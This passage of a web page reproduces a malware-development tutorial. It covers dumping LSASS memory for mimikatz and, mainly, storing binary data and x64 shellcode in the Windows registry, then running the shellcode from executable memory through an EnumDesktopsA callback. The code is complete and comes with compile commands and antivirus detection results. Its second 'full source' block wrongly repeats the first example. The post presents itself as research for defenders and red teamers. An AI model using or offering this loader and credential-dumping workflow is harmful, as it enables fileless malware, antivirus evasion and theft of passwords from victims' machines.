+<div class="my-3 space-y-2"><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>execute hack.exe on victim’s machine</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>so, lsass.dmp gets dumped to the working directory</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>take the lsass.dmp offline to our attacking windows machine</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>open mimikatz and load in the dump file</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>dump passwords of victim’s machine (on attacker’s machine)!</span></div></div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This is just one of the methods, I will try to tell about the another in the future. This trick is used many APTs and hacking tools in the wild. For example, Cobalt Strike can spawn a job to inject into LSASS memory and dump password hashes. Fox Kitten and HAFNIUM used procdump to dump the LSASS process memory. I hope this post spreads awareness to the blue teamers of this interesting technique, and adds a weapon to the red teamers arsenal. MITRE ATT&CK - OS Credential Dumping: LSASS Memory APT3</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Cobalt Strike Fox Kitten HAFNIUM mimikatz MiniDumpWriteDump source code in github</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">42. malware development trick. Store binary data in registry. Simple C++ example</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Today, I just want to focus my research on another malware development trick: storing binary data in Windows Registry. It is a common technique that can be used by malware for persistence or also to store malicious payloads.</p>
+
+            <div id="practical-example-1" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Practical example 1</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Below is a simple example code of storing binary data in the registry: void registryStore() { HKEY hkey; BYTE data[] = {0x6d, 0x65, 0x6f, 0x77, 0x6d, 0x65, 0x6f, 0x77};</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">DWORD d;
+const char* secret = "Software\\meowApp";
+LSTATUS res = RegCreateKeyEx(HKEY_CURRENT_USER, (LPCSTR) secret, 0, NULL, 0,
+KEY_WRITE, NULL, &amp;hkey, &amp;d);
+printf (res != ERROR_SUCCESS ? "failed to create reg key :(\n" :
+"successfully create key :)\n");
+res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR) secret, 0, KEY_WRITE, &amp;hkey);
+printf (res != ERROR_SUCCESS ? "failed open registry key :(\n" :
+"successfully open registry key :)\n");
+res = RegSetValueEx(hkey, (LPCSTR)"secretMeow", 0, REG_BINARY, data,
+sizeof(data));
+printf(res != ERROR_SUCCESS ? "failed to set registry value :(\n" :
+"successfully set registry value :)\n");
+
+RegCloseKey(hkey);
+}
+This code will write the binary data {0x6d, 0x65, 0x6f, 0x77, 0x6d, 0x65,
+0x6f, 0x77} to HKEY_CURRENT_USER\Software\meowApp\secretMeow. As you
+can see, you need to create the Software\meowApp key before storing. Please ensure
+that you have appropriate permissions to write to the registry.</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Ok, then how can I retrieving this binary data from registry? It’s a simple task: void registryGetData() { HKEY hkey;</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">DWORD size = 0;
+const char* secret = "Software\\meowApp";
+LSTATUS res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)secret, 0, KEY_READ, &amp;hkey);
+printf(res != ERROR_SUCCESS ? "failed to open reg key :(\n" :
+"successfully open reg key:)\n");
+res = RegQueryValueEx(hkey, (LPCSTR)"secretMeow", nullptr, nullptr, nullptr, &amp;size);
+printf(res != ERROR_SUCCESS ? "failed to query data size :(\n" :
+"successfully get binary data size:)\n");
+// allocate memory for the data
+BYTE *data = new BYTE[size];
+res = RegQueryValueEx(hkey, (LPCSTR)"secretMeow", nullptr, nullptr, data, &amp;size);
+printf(res != ERROR_SUCCESS ? "failed to query data :(\n" :
+"successfully get binary data:)\n");
+printf("data:\n");
+for (int i = 0; i &lt; size; i++) {
+printf("\\x%02x", static_cast&lt;int&gt;(data[i]));
+}
+printf("\n\n");
+RegCloseKey(hkey);
+delete[] data;
+}
+The data is read into a dynamic array, which is then printed to the console just for
+checking correctness. It is important to call delete[] on the data array after you are
+finished with it to avoid a memory leak.
+So, the full source code is look like this:
+
+/*
+* hack.cpp - store binary data in registry. C++ implementation
+* @cocomelonc
+* https://cocomelonc.github.io/malware/2023/05/22/malware-tricks-29.html
+*/
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;iostream&gt;
+void registryStore() {
+HKEY hkey;
+BYTE data[] = {0x6d, 0x65, 0x6f, 0x77, 0x6d, 0x65, 0x6f, 0x77};
+DWORD d;
+const char* secret = "Software\\meowApp";
+LSTATUS res = RegCreateKeyEx(HKEY_CURRENT_USER, (LPCSTR) secret, 0, NULL, 0,
+KEY_WRITE, NULL, &amp;hkey, &amp;d);
+printf (res != ERROR_SUCCESS ? "failed to create reg key :(\n" :
+"successfully create key :)\n");
+res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR) secret, 0, KEY_WRITE, &amp;hkey);
+printf (res != ERROR_SUCCESS ? "failed open registry key :(\n" :
+"successfully open registry key :)\n");
+res = RegSetValueEx(hkey, (LPCSTR)"secretMeow", 0, REG_BINARY, data, sizeof(data));
+printf(res != ERROR_SUCCESS ? "failed to set registry value :(\n" :
+"successfully set registry value :)\n");
+RegCloseKey(hkey);
+}
+void registryGetData() {
+HKEY hkey;
+DWORD size = 0;
+const char* secret = "Software\\meowApp";
+LSTATUS res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)secret, 0, KEY_READ, &amp;hkey);
+printf(res != ERROR_SUCCESS ? "failed to open reg key :(\n" :
+"successfully open reg key:)\n");
+res = RegQueryValueEx(hkey, (LPCSTR)"secretMeow", nullptr, nullptr, nullptr, &amp;size);
+printf(res != ERROR_SUCCESS ? "failed to query data size :(\n" :
+"successfully get binary data size:)\n");
+// allocate memory for the data
+
+BYTE *data = new BYTE[size];
+res = RegQueryValueEx(hkey, (LPCSTR)"secretMeow", nullptr, nullptr, data, &amp;size);
+printf(res != ERROR_SUCCESS ? "failed to query data :(\n" :
+"successfully get binary data:)\n");
+printf("data:\n");
+for (int i = 0; i &lt; size; i++) {
+printf("\\x%02x", static_cast&lt;int&gt;(data[i]));
+}
+printf("\n\n");
+RegCloseKey(hkey);
+delete[] data;
+}
+int main(void) {
+registryStore();
+registryGetData();
+return 0;
+}
+Note that it’s just a dirty PoC.
+demo 1</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to see everything in action. First of all compile our “malware” in the attacker’s machine: x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \ -I/usr/share/mingw-w64/include/ -s \ -ffunction-sections -fdata-sections -Wno-write-strings \ -fno-exceptions -fmerge-all-constants -static-libstdc++ \ -static-libgcc -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, just run powershell as Administrator and execute our binary in victim’s machine (Windows 10 22H2 x64): .\hack.exe</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, everything is worked perfectly! =.. =</p>
+
+            <div id="practical-example-2" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Practical example 2</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">What about to store payload in registry? Let’s go to check it in practice. Just modify our functions from hack.cpp: void registryStore() { HKEY hkey; const unsigned char data[] = "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41" "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60" "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72" "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac" "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48" "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f" "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49" "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01" "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01" "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1" "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41" "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b" "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58" "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41" "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7" "\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e" "\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83" "\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd" "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0" "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff" "\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e" "\x2e\x2e\x5e\x3d\x00";</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">DWORD d;
+const char* secret = "Software\\meowApp";
+LSTATUS res = RegCreateKeyEx(HKEY_CURRENT_USER, (LPCSTR) secret, 0, NULL, 0,
+KEY_WRITE, NULL, &amp;hkey, &amp;d);
+printf (res != ERROR_SUCCESS ? "failed to create reg key :(\n" :
+"successfully create key :)\n");
+res = RegSetValueEx(hkey, (LPCSTR)"secretMeow", 0, REG_BINARY, data, sizeof(data));
+printf(res != ERROR_SUCCESS ? "failed to set registry value :(\n" :
+"successfully set registry value :)\n");
+RegCloseKey(hkey);
+}
+As usually, I used meow-meow messagebox payload:
+const unsigned char data[] =
+"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
+"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
+"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
+"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
+"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
+"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
+"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
+"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
+"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
+"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
+
+"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
+"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
+"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
+"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
+"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
+"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
+"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
+"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
+"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
+"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
+"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
+"\x2e\x2e\x5e\x3d\x00";
+Then, retrieve shellcode and execute via EnumDesktopsA:
+void registryGetData() {
+HKEY hkey;
+DWORD size = 0;
+const char* secret = "Software\\meowApp";
+LSTATUS res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)secret, 0, KEY_READ, &amp;hkey);
+printf(res != ERROR_SUCCESS ? "failed to open reg key :(\n" :
+"successfully open reg key:)\n");
+res = RegQueryValueEx(hkey, (LPCSTR)"secretMeow", nullptr, nullptr,
+nullptr, &amp;size);
+printf(res != ERROR_SUCCESS ? "failed to query data size :(\n" :
+"successfully get binary data size:)\n");
+// allocate memory for the data
+LPVOID data = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE,
+PAGE_EXECUTE_READWRITE);
+res = RegQueryValueEx(hkey, (LPCSTR)"secretMeow", nullptr, nullptr,
+static_cast&lt;LPBYTE&gt;(data), &amp;size);
+printf(res != ERROR_SUCCESS ? "failed to query data :(\n" :
+"successfully get binary data:)\n");
+EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)data,
+(LPARAM)NULL);
+// clean up
+VirtualFree(data, 0, MEM_RELEASE);
+RegCloseKey(hkey);
+}
+
+So, full source code for our second example is:
+/*
+* hack.cpp - store binary data in registry. C++ implementation
+* @cocomelonc
+* https://cocomelonc.github.io/malware/2023/05/22/malware-tricks-29.html
+*/
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;iostream&gt;
+void registryStore() {
+HKEY hkey;
+BYTE data[] = {0x6d, 0x65, 0x6f, 0x77, 0x6d, 0x65, 0x6f, 0x77};
+DWORD d;
+const char* secret = "Software\\meowApp";
+LSTATUS res = RegCreateKeyEx(HKEY_CURRENT_USER, (LPCSTR) secret, 0, NULL, 0,
+KEY_WRITE, NULL, &amp;hkey, &amp;d);
+printf (res != ERROR_SUCCESS ? "failed to create reg key :(\n" :
+"successfully create key :)\n");
+res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR) secret, 0, KEY_WRITE, &amp;hkey);
+printf (res != ERROR_SUCCESS ? "failed open registry key :(\n" :
+"successfully open registry key :)\n");
+res = RegSetValueEx(hkey, (LPCSTR)"secretMeow", 0, REG_BINARY, data, sizeof(data));
+printf(res != ERROR_SUCCESS ? "failed to set registry value :(\n" :
+"successfully set registry value :)\n");
+RegCloseKey(hkey);
+}
+void registryGetData() {
+HKEY hkey;
+DWORD size = 0;
+const char* secret = "Software\\meowApp";
+LSTATUS res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)secret, 0, KEY_READ, &amp;hkey);
+printf(res != ERROR_SUCCESS ? "failed to open reg key :(\n" :
+"successfully open reg key:)\n");
+res = RegQueryValueEx(hkey, (LPCSTR)"secretMeow", nullptr, nullptr, nullptr, &amp;size);
+printf(res != ERROR_SUCCESS ? "failed to query data size :(\n" :
+"successfully get binary data size:)\n");
+
+// allocate memory for the data
+BYTE *data = new BYTE[size];
+res = RegQueryValueEx(hkey, (LPCSTR)"secretMeow", nullptr, nullptr, data, &amp;size);
+printf(res != ERROR_SUCCESS ? "failed to query data :(\n" :
+"successfully get binary data:)\n");
+printf("data:\n");
+for (int i = 0; i &lt; size; i++) {
+printf("\\x%02x", static_cast&lt;int&gt;(data[i]));
+}
+printf("\n\n");
+RegCloseKey(hkey);
+delete[] data;
+}
+int main(void) {
+registryStore();
+registryGetData();
+return 0;
+}
+demo 2</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to see in action this logic. First of all compile hack2.cpp: x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \ -I/usr/share/mingw-w64/include/ -s \ -ffunction-sections -fdata-sections -Wno-write-strings \ -fno-exceptions -fmerge-all-constants -static-libstdc++ \ -static-libgcc -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, just run powershell as Administrator and execute our binary in victim’s machine (Windows 10 22H2 x64): .\hack2.exe</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, everything is worked as expected! =.. = This method of executing code is often used by malicious software (for example ComRAT, PillowMint and PipeMon) and APT groups (Turla), so it’s likely to be flagged by antivirus software, and may not work on systems with certain security measures in place. Let’s go to upload it to VirusTotal:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">https://www.virustotal.com/gui/file/fe7e412aef1af9dee801224567151f7eaa17ffdbc8 c1e97202b4faccb53100e8/details So, 16 of of 70 AV engines detect our file as malicious. I hope this post spreads awareness to the blue teamers of this interesting malware dev technique, and adds a weapon to the red teamers arsenal. RegCreateKeyEx RegOpenKeyEx RegSetValueEx EnumDesktopsA MITTRE ATT&CK: Fileless Storage ComRAT PillowMint PipeMon Turla source code in github</p></main></body></html>
